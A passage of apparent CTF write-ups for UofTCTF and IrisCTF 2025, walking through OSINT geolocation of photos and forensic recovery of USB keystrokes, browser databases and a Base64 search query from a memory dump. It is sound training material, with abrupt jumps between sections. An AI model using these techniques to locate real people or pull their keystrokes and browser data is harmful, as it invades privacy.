uoftctf{Jean-Pierre Brehier}\n\nAuthor: windex\n\n#### Solution\n\nWe received the following image file:\n\n![Building Image](/images/posts/2025-uoftctf/misc/surgery/image.png)\n\nI attempted a Google Image Search on this image with the prompt: \"Where is this surgery place located?\" and found this link: https://medtour.help/clinic/jk-plastic-surgery/. I confirmed that this was the correct building because the image matched perfectly.\n\nOn the same site, I found the names of several doctors:\n\n![Doctors](/images/posts/2025-uoftctf/misc/surgery/doctors.png)\n\nI began checking them one by one. It’s worth noting that in South Korea, names are written with the last name first, followed by the first name. So, I reversed the name order for each doctor.\n\nAfter some time, I identified the correct doctor: Kim Sung-Sik.\n\nFlag:\n\n```yaml\nuoftctf{Sung-Sik Kim}\n```\n\n## Web\n\n### Scavenger Hunt\n\n#### Challenge Description\n\nYou know what to do.\n\nVisit the website [here](http://34.150.251.3:3000)\n\nAuthor: SteakEnthusiast\n\n####  Solution\n\nThis was an easy web challenge and had many solves, so I decided to attempt it.

You just have to narrow down the useful data from all the information available to you. Always check for keywords, regional distinctions, special marks, or buildings, as the victim often leaves minor traces by mistake, which can help you identify them.\n\nI created this writeup in detail, especially for first-time solvers. 😉\n\n\n#### Solution\n\nIn the challenge description, keywords like *Baja California Sur, Beach, Golf, and Hotel's location farther from the main city* are traces left by the victim that can help us move forward.\n\n##### Exploring the Clues\nLet’s visit the website:\n\n![Adam's Blog](/images/posts/2025-irisctf/osint/coow/adam_site.png)\n\n\n![Adam's Stories](/images/posts/2025-irisctf/osint/coow/adam_site2.png)\n\nOn the website, we find many blogs and stories by Adam about the places he visited and the food he ate. \n\nBy matching the description, we identify that the `Pizza by The Water` blog is the most relevant one for this challenge.\n\n![Pizza By The Water's Blog](/images/posts/2025-irisctf/osint/coow/blog.png)\n\nIn the blog's image, we notice the hotel's architecture in the background, along with a pool. Since we have an image related to the location, we can perform a [Reverse Image Search](https://en.wikipedia.org/wiki/Reverse_image_search) using Google Lens.\n\n```\nNote: If the location is based in Russia, Yandex is preferable for reverse image searches. Similarly, if a country has its own powerful search engine, use that for better results.\n```\n\n\n![Google Image Search](/images/posts/2025-irisctf/osint/coow/first_google_search.png)\n\nInitially, when I searched using the full image (including the pizza and the hotel), most results were about pizzas, related sites, and posts.\n\nTo refine the search, we need to narrow down the content we are focusing on. For the next search, I used only the hotel's image and included the location Baja California Sur. This helped narrow down the results significantly.\n\n![Hotel's Name](/images/posts/2025-irisctf/osint/coow/google_image_search.png)\n\nIn the refined search results, as seen above, the AI and other sites directly suggested the hotel's name, unlike the first search. This demonstrates the importance of crafting an effective search prompt, as search engines have vast amounts of data to process.\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n```yaml\nirisctf{Hilton_Los_Cabos_Beach_and_Golf_Resort}\n```\n\nHurray!!!\n\n### Sleuths and Sweets\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/sas/desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got these: *Japan, Crepes, Foot Traffic*—traces left by the victim that can help us move forward.\n\nLet's visit the website for this blog:\n\n![Blog 1](/images/posts/2025-irisctf/osint/sas/blog_1.png)\n![Blog 2](/images/posts/2025-irisctf/osint/sas/blog_2.png)\n\nThis time, we had 3 images. When I did a Reverse Image Search for the 1st and the 3rd images, I didn’t get much exact information because they looked very common across Japan.\n\nWhen I did a Reverse Image Search for the 2nd image, I got these results:\n\n![Image Search](/images/posts/2025-irisctf/osint/sas/second_image_search.png)\n\nSuggesting `Marion Crepe Ueno Ameyoko Store`, which was not the correct address for the flag. \n\n##### Exploring other way\n\nSo this time, I tried another method. As the description mentioned Foot Traffic, I searched for the place with the highest foot traffic in Japan. \n\n```\nThe place with the highest foot traffic in Japan is Shibuya Crossing in Tokyo, which is widely considered the busiest pedestrian crossing in the world, with thousands of people crossing at once during rush hour. \n```\n\nI then refined my search for crepe shops near Shibuya Crossing on Google Maps. After checking several stores, I finally found the correct one, as shown below:\n\n![Desired Store](/images/posts/2025-irisctf/osint/sas/crepes_store.png)\n\nLocation: [Marion Crepes Shibuya Modi](https://maps.app.goo.gl/9np7WRbr9eapY6dZ9)\n\nIt had similar images to those given in the blog.\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag: \n\n```yaml\nirisctf{1_Chome_21_3_Jinnan_Shibuya}\n```\n\nAnother one solved! 🥳 \n\n### Not Eelaborate\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/ne/desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got these: *Title - Eel, Deer Park, Japenese Food, Quiet Restaurant*- traces left by the victim that can help us move forward.\n\nLet's visit the website for this blog:\n\n![Blog](/images/posts/2025-irisctf/osint/ne/blog.png)\n\nSo, I started searching for Deer Parks in Japan and found one famous Deer Park, `Nara Park`, which helped me narrow down my search.\n\nThe food dishes mentioned in the blog hinted at the `Unagi Dish`. I then did a Reverse Image Search for the given image using the prompt `Unagi Dish Restaurant near Nara Park`. This search suggested some restaurants, and the first restaurant had a similar dish plate, as shown below:\n\n![Image Search](/images/posts/2025-irisctf/osint/ne/image_search.png)\n\nFinally, search for the restaurant on Google Maps, and you will get the correct name, which is located near Nara Park.\n\n![Restaurant](/images/posts/2025-irisctf/osint/ne/restaurant.png)\n\nLocation: [Edogawa Kintetsu Nara](https://maps.app.goo.gl/d2VqjxsCzop5jx1y6)\n\n##### Creating the Flag\n\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n```yaml\nirisctf{Edogawa_Kintetsu_Nara}\n```\n\nOne more solved!\n\n### Late Night Bite\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/lnb/desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nThis challenge was a little tricky. Let's start.\n\nAccording to the description, Adam hid his favorite hangout spot, which he had recorded in the past.\n\nAt first, I thought he didn’t directly mention the Late Night Bite blog, so I explored the other uncovered blogs but didn’t find anything useful related to the challenge.\n\nThen, I went to the `About` section of Adam's site.\n\n![About](/images/posts/2025-irisctf/osint/lnb/about.png)\n\nIn the About section, I noticed that Adam is a food blogger based in Southern California and that on Wednesdays, he stops by the farmer’s market before work.\n\nI speculated that the farmer's market might be the nearest location around his house. When I did a Reverse Image Search on the image provided in the About section, I realized the location was `Santa Monica Pier`.\n\nI then did another Reverse Image Search with the prompt:\n\n![Image Search](/images/posts/2025-irisctf/osint/lnb/image_search.png)\n\nI believed Adam was talking about the `Downtown Farmers Market` because of the Wednesday mention.\n\nBut I still didn’t have any clue about the restaurant's name, so I started searching through the blog on his site again. Since I have some foundational knowledge of web dev/exp, I began by viewing the Page Source. In the source, Adam mentioned this line:\n\n```\n<!-- MY SUPER SECRET POST: \"late night bite\" -->\n```\n\nThen, I tried the robots.txt endpoint – https://osint-food-blog-web.chal.irisc.tf/robots.txt.\n\nThere, I found a mention of: Sitemap: /sitemap.xml.\n\nI went to this endpoint and discovered every endpoint related to his blogs. After scrolling, I found a mention of the Late Night Bite blog as:\n\n```\n<url>\n<loc>/late-night-bite/</loc>\n<lastmod>2025-01-02T00:00:00-08:00</lastmod>\n</url>\n```\nSo, finally, I found the blog that was hidden by Adam.\n\n![Late Night Bite Blog](/images/posts/2025-irisctf/osint/lnb/late_night_bite_blog.png)\n\nSo, I quickly searched for a Modern Local Izakaya Restaurant with those features near Santa Monica on Google.\n\nI found this helpful site:\n\n![Restaurants](/images/posts/2025-irisctf/osint/lnb/restaurant.png)\n\nThe first restaurant, Shirubē, was near the Downtown Farmers Market, and it also had the features mentioned by Adam.\n\n##### Creating the Flag\n\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n``` yaml\nirisctf{Shirube}\n```\n\n*This marks the last challenge based on the Food Blog website.

I got this: *Good Fuel Deal*.\n \n![Chal's Image](/images/posts/2025-irisctf/osint/fd/fuel-deal.png)\n\nI did a Reverse Image Search but didn’t get much of a lead. Then, I tried one of the cool tools, [GeoSpy AI](https://geospy.ai/), which showed me this result:\n\n![GeoSpy AI's Result](/images/posts/2025-irisctf/osint/fd/geospy_ai.png)\n\nNot every time does this AI give you the correct location, but since there were mentions of Australia in my Google Image Search, I decided to try the suggested location, Melbourne, Australia.\n\nI then searched on Google with the query: `Where were the cheap fuels (with the rate price mentioned in the provided image) in Melbourne?` and got some of these results:\n\n```\nThe cheapest diesel available in Victoria costs 183.9 cents per litre.\n```\n\nThen found this helpful site : https://www.carexpert.com.au/car-news/the-cheapest-petrol-and-diesel-around-australia-this-week\\\n\nThe above site had these rates : \n\n```less\nVictoria-\n\nThe cheapest unleaded petrol in Victoria today costs 169.9 cents per litre.

Finally, when I was searching for the `SE Fuel Mount Waverly` location on Google Maps, I found some of these fuel stations:\n\n![SE Fuel Mount Waverly](/images/posts/2025-irisctf/osint/fd/se_fuel_search_result.png)\n\nAfter scrolling down, I identified that the Shell station was the desired fuel station. If you check the photos or the 360-degree view of that location, it was identifiable with the provided image.\n\nLocation : [Shell](https://maps.app.goo.gl/3CazWSRMCeDk5Wip7)\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n```yaml\nirisctf{203_Gallaghers_Road_Glen_Waverley_Victoria_Australia}\n```\n\nWoah!!!\n\n### Where's Bobby\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/wb/desc.png)\n\nSource File: [files](/images/posts/2025-irisctf/osint/wb/wheres-bobby.tar.gz)\n\nHints releasd on Discord Announcements:\n\n![Hints](/images/posts/2025-irisctf/osint/wb/hints.png)\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got these: *Road Trip, Water Body, Not much populated areas* - traces left by the author.\n\nProvided Image:\n\n<img src=\"/images/posts/2025-irisctf/osint/wb/wheres-bobby.jpg\" alt=\"Source File Image\" height=\"700\">\n\n<!-- ![Source File Image](/images/posts/2025-irisctf/osint/wb/wheres-bobby.jpg) -->\n\nI like the view of the image. This image was taken from a car on a road that appears to be in the middle of the mountains.\n\nWhen we zoom in on the image, we can see something written in Chinese on the board. I checked it using Google Translator:\n\n<img src=\"/images/posts/2025-irisctf/osint/wb/translated.jpg\" alt=\"Translated\" height=\"400\">\n\n<!-- ![Translated Text](/images/posts/2025-irisctf/osint/wb/translated.jpg) -->\n\nTranslated Text in the above image:\n```\nSmooth traffic from Xishatun Bridge to Louzizhuang Bridge.\n```\n\nThe board was showing the traffic conditions of the upcoming bridges, which means the author was about to enter this bridge via the connected roads from where they were coming.\n\nThe possible routes near these two bridges are:\nG7, G6, G4501, S216, S321, S3801.\n\n![Google Map](/images/posts/2025-irisctf/osint/wb/google_map.png)\n\nAs the author mentioned the surroundings of the route as *Water Body, Not much populated areas*, the road in the provided image was surrounded by mountains.\n\nWith these specifications, I started matching the description with the route numbers found earlier:\n\n- I couldn’t find a water body around G7.\n- G6 was heavily populated.\n- G4501 was not deep into the mountains.\n- S216 and S321 were primarily in city regions.\n- Lastly, S3801 had water bodies and very sparsely populated areas around it, which led me to consider it for flag verification.\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nHooray! It was the correct flag!!!\n\nFlag:\n\n```yaml\nirisctf{S3801_CN}\n```\n\n### Where's Bobby 2\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/wb2/desc.png)\n\nSource File: [files](/images/posts/2025-irisctf/osint/wb2/wheres-bobby-2.tar.gz)\n\nHints released on Discord Announcements:\n![Hints](/images/posts/2025-irisctf/osint/wb2/hints.png)\n\nYoutube Video Link: https://www.youtube.com/watch?v=L9Di-UVC-_4\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nProvided Image:\n\n![Wall Art](/images/posts/2025-irisctf/osint/wb2/wheres-bobby-2.jpg)\n\nI did a Reverse Image Search using Google Lens and found these helpful sites:\n```\n- https://ameblo.jp/yorinoto/entry-12733913890.html\n- https://m.sohu.com/a/545522713_99946287/?pvid=000115_3w_a\n```\nAfter exploring these sites, I discovered that the location name is `Bai Zi Wan Subway Station`, and the wall art is `\"Hundred Ziwan Kissho\" / \"The Hundred Children Playing in Baizi Bay\"` painting.\n\n##### The Challenge with Finding the Coordinates\n\nFinding the exact coordinates was tough for non-Chinese users because all locations on Google Maps for China are shifted by a few units. You can learn more about this issue from the provided YouTube video.\n\nAlthough it was mentioned not to use Chinese maps or software, I took a look on the `Baidu Map`.\n\n![Baidu Map](/images/posts/2025-irisctf/osint/wb2/baid_maps.png)\n\nAs shown, the main station and the exit buildings are located at the bottom part of the image.\n\nWhen I checked Google Maps, I got this result:\n\n![Google Map](/images/posts/2025-irisctf/osint/wb2/google_map.png)\n\nThe coordinates were shifted, and submitting them didn’t yield the correct result.\n\nI also tried the English version of Wikipedia, which had the coordinates for the station, but again, they were incorrect. Wikipedia then directed me to Bing Maps:\n\n![Bing Map](/images/posts/2025-irisctf/osint/wb2/bing.png)\n\nHowever, the coordinates from Bing Maps were also inaccurate.\n\n##### Exploring Other Sources\n\nNext, I started searching for documented articles that might include the exact coordinates for the station. I looked at the [Baidu Encyclopedia](https://baike.baidu.com/) site:\n\n![Baidu Encyclo](/images/posts/2025-irisctf/osint/wb2/baidu_encyclo.png)\n\nUnfortunately, it didn’t mention any coordinates.\n\nFinally, after more extensive searching 😵‍💫, I found the Chinese-language version of [Wikipedia](https://zh.wikipedia.org/zh-cn), specifically tailored for Simplified Chinese characters (used in Mainland China and Singapore).\n\n![Wikipedia(CN)](/images/posts/2025-irisctf/osint/wb2/wiki.png)\n\nLink: https://zh.wikipedia.org/zh-cn/%E7%99%BE%E5%AD%90%E6%B9%BE%E7%AB%99_(%E5%9C%B0%E9%93%81)\n\nThis page included the coordinates.\n\n##### Verifying the Coordinates\nI quickly entered the coordinates on Google Maps. Although the result was still shifted from the exact building, I refined the search as shown below:\n\n![Google Maps](/images/posts/2025-irisctf/osint/wb2/correct_coords.png)\n\nCoordinates: 39.891389, 116.491667\n\nI rounded off the coordinates to 3 decimal points: 39.891, 116.492.\n\nAfter submitting these refined coordinates, I confirmed that they were the desired ones for this challenge. 😮‍💨\n\nFlag:\n\n```yaml\nirisctf{39.891_116.492}\n```\n\n*This marks the last challenge based on the files. Thanks to `bobby` for creating this amazing challenge; I really enjoyed it.*\n\n## Forensics\n\n### Deldeldel\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/deldeldel/desc.png)\n\nSource File: [deldeldel.tar.gz](/images/posts/2025-irisctf/forensics/deldeldel/deldeldel.tar.gz)\n\n#### Solution\n\n```bash\n$ file klogger.pcapng \nklogger.pcapng: pcapng capture file - version 1.0\n```\n\nWe received a .pcapng file for this challenge. When I opened it in Wireshark, the packets were exclusively based on the USB protocol.\n\n![USB Protocol Packets](/images/posts/2025-irisctf/forensics/deldeldel/usb_protocol.png)\n\nThe mention of \"keys\" and the file name klogger (key logger) hinted that this was likely a USB Keyboard/Keypad challenge.\n\nUSB Protocol challenges are a standard type in the Forensics category of CTFs and often repeat with slight modifications. The goal is to extract the USB HID data or CAP data available at the bottom of the packets, which contains useful information about the user's activity on the USB device.\n\nSources:\n```\nhttp://www.usb.org/developers/hidpage/ \n\nSee section 10 Keyboard/Keypad Page (0x07) of document USB HID Usage Tables Version 1.12.\n\nDefinition of these 3 bytes can be found in section B.1 Protocol 1 (Keyboard) of document Device Class Definition for HID Version 1.11.\n```\n\nTo analyze the user's activity, we check the flow of USB IN packets (packets sent from the device to the host). These are typically user activities.\n\n##### Filtering the USB IN Packets\nTo narrow down the USB IN packets, I applied the following filter in Wireshark:\n\n`usb.transfer_type == 1 && usb.endpoint_address.direction == 1`\n\n![USB IN Packets](/images/posts/2025-irisctf/forensics/deldeldel/usb_in.png)\n\nHere, we can see source IPs such as 1.3.2, 1.7.1, 1.5.1, and 1.5.2.\n\n##### Extracting USB CAP Data\nThe USB HID data/CAP data is usually 8 bytes. I started by analyzing the packets from 1.3.2, as they had 8-byte CAP data.\n\nTo extract the USB capture data, I used the tshark CLI. \n\n```bash\n$ tshark -r klogger.pcapng -Y \"usb.transfer_type == 1 && usb.endpoint_address.direction == 1 && usb.src==1.3.2\" -T fields -e usb.capdata > data_1.3.2.txt\n```\n##### Parsing USB CAP Data\n\nFor parsing the USB capture data into readable data, I used the following script:\n\n```python\nimport sys\n\n# USB HID Keymap for decoding key codes\nKEY_CODES = {\n    0x04: ['a', 'A'], 0x05: ['b', 'B'], 0x06: ['c', 'C'], 0x07: ['d', 'D'],\n    0x08: ['e', 'E'], 0x09: ['f', 'F'], 0x0A: ['g', 'G'], 0x0B: ['h', 'H'],\n    0x0C: ['i', 'I'], 0x0D: ['j', 'J'], 0x0E: ['k', 'K'], 0x0F: ['l', 'L'],\n    0x10: ['m', 'M'], 0x11: ['n', 'N'], 0x12: ['o', 'O'], 0x13: ['p', 'P'],\n    0x14: ['q', 'Q'], 0x15: ['r', 'R'], 0x16: ['s', 'S'], 0x17: ['t', 'T'],\n    0x18: ['u', 'U'], 0x19: ['v', 'V'], 0x1A: ['w', 'W'], 0x1B: ['x', 'X'],\n    0x1C: ['y', 'Y'], 0x1D: ['z', 'Z'], 0x1E: ['1', '!'], 0x1F: ['2', '@'],\n    0x20: ['3', '#'], 0x21: ['4', '$'], 0x22: ['5', '%'], 0x23: ['6', '^'],\n    0x24: ['7', '&'], 0x25: ['8', '*'], 0x26: ['9', '('], 0x27: ['0', ')'],\n    0x28: ['\\n', '\\n'], 0x2A: ['[BACKSPACE]', '[BACKSPACE]'], 0x2B: ['\\t', '\\t'],\n    0x2C: [' ', ' '], 0x2D: ['-', '_'], 0x2E: ['=', '+'], 0x2F: ['[', '{'],\n    0x30: [']', '}'], 0x33: [';', ':'], 0x34: [\"'\", '\"'], 0x36: [',', '<'],\n    0x37: ['.', '>'], 0x38: ['/', '?'], 0x39: ['[CAPSLOCK]', '[CAPSLOCK]'],\n    0x4F: [u'→', u'→'], 0x50: [u'←', u'←'], 0x51: [u'↓', u'↓'], 0x52: [u'↑', u'↑']\n}\n\ndef decode_keylogger(file):\n    with open(file, 'r') as f:\n        lines = f.read().splitlines()\n\n    decoded_output = \"\"\n    for line in lines:\n        if len(line) != 16:\n            continue\n\n        # Parse the 8-bytes payload\n        modifier = int(line[0:2], 16)\n        key_code = int(line[4:6], 16)\n\n        # Ignore empty key codes\n        if key_code == 0:\n            continue\n\n        # Decode keypress\n        is_shift = (modifier & 0x02) != 0  # Check if Shift is active\n        char = KEY_CODES.get(key_code, [''])[is_shift]  # Select shifted/unshifted char\n\n        if char == '[BACKSPACE]':  # Handle backspace\n            decoded_output = decoded_output[:-1]\n        else:\n            decoded_output += char\n\n    return decoded_output\n\nif __name__ == '__main__':\n    if len(sys.argv) < 2:\n        print('Usage: python3 script.py <data.txt>')\n        sys.exit(1)\n\n    file_path = sys.argv[1]\n    result = decode_keylogger(file_path)\n    print(result)\n```\n\n```bash\n$ python3 usbkeyboard.py data_1.3.2.txt \ngabaacbacaabbbbabbabcbbcccdcdcdcccbccbbcbaaaaaaaaabcabadadcacacbacaaabbbacbacbcbb\n```\nHowever, the data retrieved from 1.3.2 was garbage. I then moved on to another source IP (1.5.1), which also had 8-byte CAP data, and repeated the tshark steps.\n\n```bash\n$ python3 usbkeyboard.py data_1.5.1.txt \nHheey   AAalicce! Ii  tthink  Ii''m  ssupppooseed  too  giivee yoou   tiss fllaag:\n\niriisctfF{[tthis_akeyloggeer_iisS_too_hard_to_use}\n```\n\n##### Creating the Flag\nAfter extracting the data, I cleaned up the received flag and formatted it properly as per the challenge's defined format.\n\nFlag:\n\n```yaml\nirisctf{this_keylogger_is_too_hard_to_use}\n```\n\n### Windy Day\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/wd/desc.png)\n\n#### Solution\n\nWe received a memory dump for this challenge. The title, `Windy Day`, hints towards Windows OS, and the description, `lost track of an important note...`, suggests we may need to retrieve some crucial information from the memory.\n\n##### Initial Analysis\n\nI started analyzing the memory dump using [Volatility3](https://github.com/volatilityfoundation/volatility3).\n\n```bash\n$ python3 vol.py -f memdump.mem windows.info\nVolatility 3 Framework 2.12.0\nProgress:  100.00\t\tPDB scanning finished                        \nVariable\tValue\n\nKernel Base\t0xf80365200000\nDTB\t0x1ab000\nSymbols\tfile:///home/ubuntu/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/D5E3E35C1C2D48E9906F43C7C05FA3F0-1.json.xz\nIs64Bit\tTrue\nIsPAE\tFalse\nlayer_name\t0 WindowsIntel32e\nmemory_layer\t1 FileLayer\nKdVersionBlock\t0xf803654f4df8\nMajor/Minor\t15.14393\nMachineType\t34404\nKeNumberProcessors\t1\nSystemTime\t2025-01-03 17:11:15+00:00\nNtSystemRoot\tC:\\Windows\nNtProductType\tNtProductServer\nNtMajorVersion\t10\nNtMinorVersion\t0\nPE MajorOperatingSystemVersion\t10\nPE MinorOperatingSystemVersion\t0\nPE Machine\t34404\nPE TimeDateStamp\tTue Oct 22 04:58:19 2024\n```\nAs usual, I first listed all the processes. \n\n```bash\n$ python3 vol.py -f memdump.mem windows.pslist\nVolatility 3 Framework 2.12.0\nProgress:  100.00\t\tPDB scanning finished                        \nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\tFile output\n\n4\t0\tSystem\t0xe38cb727f6c0\t98\t-\tN/A\tFalse\t2025-01-03 16:50:11.000000 UTC\tN/A\tDisabled\n.\n.\n3036\t4060\tfirefox.exe\t0xe38cb818b500\t89\t-\t1\tTrue\t2025-01-03 16:55:40.000000 UTC\tN/A\tDisabled\n3968\t3036\tfirefox.exe\t0xe38cb75b9080\t22\t-\t1\tTrue\t2025-01-03 16:55:41.000000 UTC\tN/A\tDisabled\n3624\t3036\tfirefox.exe\t0xe38cbb380080\t5\t-\t1\tTrue\t2025-01-03 16:55:41.000000 UTC\tN/A\tDisabled\n3828\t3036\tfirefox.exe\t0xe38cbb539800\t17\t-\t1\tTrue\t2025-01-03 16:55:43.000000 UTC\tN/A\tDisabled\n2420\t3036\tfirefox.exe\t0xe38cbb711800\t5\t-\t1\tTrue\t2025-01-03 16:55:44.000000 UTC\tN/A\tDisabled\n4076\t3036\tfirefox.exe\t0xe38cbb116080\t17\t-\t1\tTrue\t2025-01-03 16:55:45.000000 UTC\tN/A\tDisabled\n3132\t3036\tfirefox.exe\t0xe38cbb1e1080\t5\t-\t1\tTrue\t2025-01-03 16:55:47.000000 UTC\tN/A\tDisabled\n712\t 628\tApplicationFra 0xe38cbb573080\t1\t-\t1\tFalse\t2025-01-03 16:56:02.000000 UTC\tN/A\tDisabled\n5044\t3036\tfirefox.exe\t0xe38cbb7c8800\t5\t-\t1\tTrue\t2025-01-03 16:56:43.000000 UTC\tN/A\tDisabled\n4772\t3036\tfirefox.exe\t0xe38cbb0d6300\t18\t-\t1\tTrue\t2025-01-03 16:57:38.000000 UTC\tN/A\tDisabled\n1380\t2856\tFTK Imager.exe 0xe38cbb82e800\t20\t-\t1\tFalse\t2025-01-03 17:02:19.000000 UTC\tN/A\tDisabled\n5324\t3036\tfirefox.exe\t0xe38cbba94080\t19\t-\t1\tTrue\t2025-01-03 17:09:52.000000 UTC\tN/A\tDisabled\n5804\t3036\tfirefox.exe\t0xe38cbb261080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n2308\t3036\tfirefox.exe\t0xe38cbbb44080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n2712\t3036\tfirefox.exe\t0xe38cbba16080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n3328\t3036\tfirefox.exe\t0xe38cbb8c6800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n6256\t3036\tfirefox.exe\t0xe38cbb884800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n5288\t3036\tfirefox.exe\t0xe38cbb8a9800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n5664\t3036\tfirefox.exe\t0xe38cbb7c9080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n5196\t3036\tfirefox.exe\t0xe38cbb8c0800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n4508\t3036\tfirefox.exe\t0xe38cbbbe8800\t19\t-\t1\tTrue\t2025-01-03 17:09:59.000000 UTC\tN/A\tDisabled\n4344\t3036\tfirefox.exe\t0xe38cbbbb8080\t19\t-\t1\tTrue\t2025-01-03 17:10:00.000000 UTC\tN/A\tDisabled\n928     3036\tfirefox.exe\t0xe38cbbc8c080\t19\t-\t1\tTrue\t2025-01-03 17:10:00.000000 UTC\tN/A\tDisabled\n740\t3036\tfirefox.exe\t0xe38cbb89e400\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n2252\t3036\tfirefox.exe\t0xe38cb7e25080\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n2920\t3036\tfirefox.exe\t0xe38cbbc9e080\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n3124\t3036\tfirefox.exe\t0xe38cbbca0080\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n7116\t3036\tfirefox.exe\t0xe38cb7e32680\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n```\n\nAmong them, I noticed multiple firefox.exe processes running. I decided to dump all the files of the Firefox process with PID 3036:\n\n```bash\n$ python3 vol.py -f memdump.mem windows.dumpfiles --pid 3036\n```\n\nThis command yielded some DLLs and database files such as .db and .sqlite.\n\n```\npermissions.sqlite  favicons.sqlite  cookies.sqlite  places.sqlite  formhistory.sqlite  storage.sqlite  cert9.db  key4.db \ndomain_to_categories.sqlite  protections.sqlite  content-prefs.sqlite  bounce-tracking-protection.sqlite  data.sqlite\n```\n\n##### Exploring the Databases\nI analyzed these database files using DB Browser.\n\nThe places.sqlite and cookies.sqlite files contained search history data. Below is a snapshot of the data from places.sqlite:\n\n![Places.sqlite](/images/posts/2025-irisctf/forensics/wd/places-sqlite.png)\n\nInitially, I suspected that the flag might have been uploaded to a file-sharing site like file.io. I explored the file.io site links but found no useful results.\n\n##### Further Investigation\nNext, I dumped the memory of the firefox.exe process for deeper analysis:\n\n```bash\n$ python3 vol.py -f memdump.mem windows.memmap --pid 3036 --dump\n```\nThis generated a pid.3036.dmp file. I ran strings on this file and noticed several links, which led me to Google Sites.\n\n```bash\n$ strings pid.3036.dmp | grep \"https://www.google.com/search?\"\n{\"1\":{\"0\":\"https://www.google.com/search?client=firefox-b-d&q=ftk+imager+portable\"}}\nhttps://www.google.com/search?client=firefox-b-d&q=ftk+imager+portable ftk imager portable - Google Search\nhttps://www.google.com/search?client=firefox-b-d&q=\nhttps://www.google.com/search?client=firefox-b-d&q=ftk+imager+portable\nhttps://www.google.com/search?client=firefox-b-d&q=\nhttps://www.google.com/search?client=firefox-b-d&q=aXJpc2N0ZntpX2FtX2\n.\n.\nhttps://www.google.com/search?client=firefox-b-d&q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D\n.\n```\n\nAmong the search queries, one appeared to be encoded in Base64.\n\n##### Decoding the Base64 String\nI decoded the Base64 string using the following command:\n\n```bash\n$ echo \"aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0=\" | base64 -d\nirisctf{i_am_an_idiot_with_bad_memory}\n```\n\nBoom! We got our flag!!!\n\nFlag: \n```yaml\nirisctf{i_am_an_idiot_with_bad_memory}\n```\n\n##### Alternate Approach\nLater, I realized the same result could have been achieved by directly running strings with base64 of \"irisctf{\" on the main memdump.mem file, which would have saved some effort. 😛\n\n### Tracem1\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/tracem/desc.png)\n\nSource File: [tracem-1.tar.gz](/images/posts/2025-irisctf/forensics/tracem/tracem-1.tar.gz)\n\n#### Solution\n\nFor this challenge, we need to identify the culprit. We were provided with a logs.json file packed with DHCP, DNS, Active Directory, and syslog logs.\n\n- The DHCP Logs show the assignment of IP addresses.\n- The DNS Logs contain records of IP address resolutions for websites.\n- The Active Directory Logs include the names of the employees within the company.\n- The Syslog Logs are primarily focused on authentication and also contain the names of the employees.\n\nLet's analyze the file:\n\n```json\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:30:39.50\", \"data\":

suspicious:\n\n```yaml\ncopious-amounts-of-illicit-substances-marketplace.com\nbreachforums.st\n```\n\nSince these sites were also matching the keywords mentioned in the description, I proceeded to

